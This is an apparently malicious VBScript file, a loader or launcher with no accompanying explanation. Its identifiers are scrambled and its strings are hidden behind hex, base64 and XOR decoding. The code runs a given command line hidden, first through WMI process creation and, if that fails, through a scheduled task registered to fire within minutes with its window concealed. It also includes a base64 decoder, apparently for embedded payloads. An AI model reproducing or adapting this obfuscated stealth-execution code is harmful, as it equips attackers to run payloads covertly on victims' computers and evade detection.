
Set wshShell = CreateObject( "WScript.Shell" )

Function GbsaLd_cHsnlAg(ByVal Sep_Srie ) 
    Dim Cptlchjzh 
    Dim ScteOnmuSerp, interValue 
    Dim theStepas 
    theStepas = Len(Sep_Srie) * 2
    Dim PgapIaurLteg 
    PgapIaurLteg = "&H"
    For Cptlchjzh = 1 To theStepas Step 4
    ScteOnmuSerp = MidB(Sep_Srie, Cptlchjzh, 4)
    ScteOnmuSerp = PgapIaurLteg & ScteOnmuSerp
    interValue = Chr(CInt(ScteOnmuSerp))
    GbsaLd_cHsnlAg = GbsaLd_cHsnlAg & interValue
    Next '//Cptlchjzh
End Function



Function SboeNuelTolrEira(UriuRgng ) 
    Dim CtgtEle , SosoAiriDhupEum 
    CtgtEle = Len(UriuRgng)
    SosoAiriDhupEum = InStr(1, UriuRgng, DtueNcimLsn(GbsaLd_cHsnlAg("56773d3d")))
    If Not SosoAiriDhupEum = 0 Then
        SboeNuelTolrEira = Right(UriuRgng, CtgtEle - SosoAiriDhupEum) 
    Else
        SboeNuelTolrEira = ""  
    End If
End Function



Sub EfdaHeomIc(GlwaLu )

    
    Const PknrIaep = 1
    
    Const TnhrEuia = 0
    
    
    Dim LiatAcetSebiOu 
    LiatAcetSebiOu = DtueNcimLsn(GbsaLd_cHsnlAg("4a424d4a44") & GbsaLd_cHsnlAg("773d3d"))
    LiatAcetSebiOu = LiatAcetSebiOu & DtueNcimLsn(GbsaLd_cHsnlAg("4577554e44316332437773514468") & GbsaLd_cHsnlAg("5944"))
    Set FbaeRnse = CreateObject(LiatAcetSebiOu)
    Call FbaeRnse.Connect
    
    
    Dim NrneSentArdga
    Set NrneSentArdga = FbaeRnse.GetFolder(DtueNcimLsn(GbsaLd_cHsnlAg("4b773d3d")))
    
    Dim ObsiNcalAtraTlgng
    Set ObsiNcalAtraTlgng = FbaeRnse.NewTask(0) 
    
    
    
    
    
    Dim RstiFa
    Set RstiFa = ObsiNcalAtraTlgng.RegistrationInfo
    
    
    Dim HetnYifh
    Set HetnYifh = ObsiNcalAtraTlgng.principal

    
    HetnYifh.LogonType = 3 
    
    
    
    Dim AtnmEipaGc
    Set AtnmEipaGc = ObsiNcalAtraTlgng.settings
    AtnmEipaGc.Enabled = True
    AtnmEipaGc.StartWhenAvailable = True
    AtnmEipaGc.Hidden = False
    
    
    Dim IueaErmhPa 
    Dim EigmCte 
    
    Dim timerObject
    timerObject = DateAdd(DtueNcimLsn(GbsaLd_cHsnlAg("42413d3d")), 1, Now)  
    IueaErmhPa = MoiaUiluPiruy(timerObject)
    timerObject = DateAdd(DtueNcimLsn(GbsaLd_cHsnlAg("42413d3d")), 10, Now) 
    EigmCte = MoiaUiluPiruy(timerObject)
    
    
    Dim UcriYmtsc
    Set UcriYmtsc = ObsiNcalAtraTlgng.triggers
    Dim CmlaCrvsIuarSc
    Set CmlaCrvsIuarSc = UcriYmtsc.Create(PknrIaep) 
    CmlaCrvsIuarSc.StartBoundary = IueaErmhPa
    CmlaCrvsIuarSc.EndBoundary = EigmCte
    CmlaCrvsIuarSc.ID = DtueNcimLsn(GbsaLd_cHsnlAg("4978") & GbsaLd_cHsnlAg("6b4d44793058427834424167633d"))
    CmlaCrvsIuarSc.Enabled = True
    
    Dim AheaEstaCao 
    Set AheaEstaCao = ObsiNcalAtraTlgng.Actions.Create(TnhrEuia)
    AheaEstaCao.Path = Split(GlwaLu, DtueNcimLsn(GbsaLd_cHsnlAg("56773d3d")))(0)
    AheaEstaCao.Arguments = SboeNuelTolrEira(GlwaLu)
    AheaEstaCao.HideAppWindow = True
    
    
    Call NrneSentArdga.RegisterTaskDefinition(DtueNcimLsn(GbsaLd_cHsnlAg("424255544842414743784d4c46") & GbsaLd_cHsnlAg("673d3d")), ObsiNcalAtraTlgng, 6, , , 3)
        
    
    TeluTlhyAmdsNtr 2
    

End Sub


Function MoiaUiluPiruy(t) 
    Dim SgmtStuoFtugTd 
    Dim RvowMtirEruhIte 
    Dim UtnaEueuTabdp 
    Dim Ims_ElcrIctpDa 
    Dim NtcoLosuIad 
    Dim AbocErebUmntUedps 
    Dim OlomRetuGclhWlneIs   
    Dim ThimEgteHi 

    SgmtStuoFtugTd = DtueNcimLsn(GbsaLd_cHsnlAg("52773d3d")) & Second(t)
    RvowMtirEruhIte = DtueNcimLsn(GbsaLd_cHsnlAg("52773d3d")) & Minute(t)
    UtnaEueuTabdp = DtueNcimLsn(GbsaLd_cHsnlAg("52773d3d")) & Hour(t)
    Ims_ElcrIctpDa = DtueNcimLsn(GbsaLd_cHsnlAg("52773d3d")) & Day(t)
    NtcoLosuIad = DtueNcimLsn(GbsaLd_cHsnlAg("52773d3d")) & Month(t)
    AbocErebUmntUedps = Year(t)

    OlomRetuGclhWlneIs = Right(UtnaEueuTabdp, 2) & DtueNcimLsn(GbsaLd_cHsnlAg("54513d3d")) & Right(RvowMtirEruhIte, 2) & _
        DtueNcimLsn(GbsaLd_cHsnlAg("54513d3d")) & Right(SgmtStuoFtugTd, 2)
    ThimEgteHi = AbocErebUmntUedps & DtueNcimLsn(GbsaLd_cHsnlAg("57673d3d")) & Right(NtcoLosuIad, 2) & DtueNcimLsn(GbsaLd_cHsnlAg("57673d3d")) & Right(Ims_ElcrIctpDa, 2)
    MoiaUiluPiruy = ThimEgteHi & DtueNcimLsn(GbsaLd_cHsnlAg("49773d3d")) & OlomRetuGclhWlneIs
End Function


Public Function AdohTdlm(CmanRth , PtvbCtapNtrmOeoi ) 
    Dim RusiLa             
    Dim EnsmSdaeYsteOce_Oc    
    Dim IelyAb        
    Dim TuelStclBfr 
    Dim LilaIeonWiouCo    
    Dim ImipAeraPmprl    

    
    For RusiLa = 1 To Len(PtvbCtapNtrmOeoi)
        
        LilaIeonWiouCo = Mid(PtvbCtapNtrmOeoi, RusiLa, 1)
        
        EnsmSdaeYsteOce_Oc = ((RusiLa - 1) Mod Len(CmanRth)) + 1
        
        ImipAeraPmprl = Mid(CmanRth, EnsmSdaeYsteOce_Oc, 1)
        
        IelyAb = IelyAb & Chr(Asc(LilaIeonWiouCo) Xor Asc(ImipAeraPmprl))
    Next '//RusiLa
    
    TuelStclBfr = IelyAb
    TuelStclBfr = Replace(TuelStclBfr, vbLf, "")
   AdohTdlm = TuelStclBfr
End Function




Function DtueNcimLsn(DataIn ) 
    Dim M_amUie 
    M_amUie = RseaTuswAbhpu(DataIn)
    DtueNcimLsn = AdohTdlm(GbsaLd_cHsnlAg("7770616a79656e79") & GbsaLd_cHsnlAg("66677566687a736c7a676a72"), M_amUie)
End Function



Sub AosiKeo(ClpfSetaNco )
    On Error Resume Next
    Err.Clear
    wimResult = RmrhSi(ClpfSetaNco)
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        GaigEtgpNrocOwivr ClpfSetaNco
        If Err.Number <> 0 Then
            Err.Clear
            EfdaHeomIc ClpfSetaNco
        End If
    End If
    On Error Goto 0
End Sub


Sub AemtBodoAo(targetPath )
    On Error Resume Next
    Err.Clear
    AosiKeo targetPath
    On Error Goto 0
End Sub


Function RmrhSi(cmdLine ) 
    Dim CengEieti 
    Dim BigiMonaKr 
    Set HelpUls = GetObject(DtueNcimLsn(GbsaLd_cHsnlAg("41426b5042783449476770634f796c494e4167") & GbsaLd_cHsnlAg("634177343743527361426c4d3d")))
    Set NanmCersEa_eYmimIe = HelpUls.Get(DtueNcimLsn(GbsaLd_cHsnlAg("49426b50575573365067734a42424156") & GbsaLd_cHsnlAg("47796b48445167544877493d")))
    Set CengEieti = NanmCersEa_eYmimIe.SpawnInstance_
    CengEieti.ShowWindow = 0
    Set BigiMonaKr = GetObject(DtueNcimLsn(GbsaLd_cHsnlAg("41426b5042783449476770634f796c494e4167634177343743527361426c4e514c6777") & GbsaLd_cHsnlAg("41536c51344a5251484752596643513d3d")))
    RmrhSi = OactIbeb(BigiMonaKr, CengEieti, cmdLine)
End Function


Private Function OactIbeb(LdriVo , IatcAe_cAtniNglgc , ElanAisnIk ) 
    Dim RhnaSomgTlhen 
    OactIbeb = LdriVo.Create(ElanAisnIk, Null, IatcAe_cAtniNglgc, RhnaSomgTlhen)
End Function



Function EoihGrmbEao(base64)
    Dim Sr_hPtieLrare, FrahGmsrCepeTo
    Set Sr_hPtieLrare = CreateObject(DtueNcimLsn(GbsaLd_cHsnlAg("4f686b4347") & GbsaLd_cHsnlAg("42595741523853535330724a44343849513d3d")))
    
    Set FrahGmsrCepeTo = Sr_hPtieLrare.createElement(DtueNcimLsn(GbsaLd_cHsnlAg("41783052")))
    FrahGmsrCepeTo.DataType = DtueNcimLsn(GbsaLd_cHsnlAg("46526b50524273454852785155") & GbsaLd_cHsnlAg("773d3d"))
    
    FrahGmsrCepeTo.Text = base64
    EoihGrmbEao = FrahGmsrCepeTo.NodeTypedValue
End Function



 
 
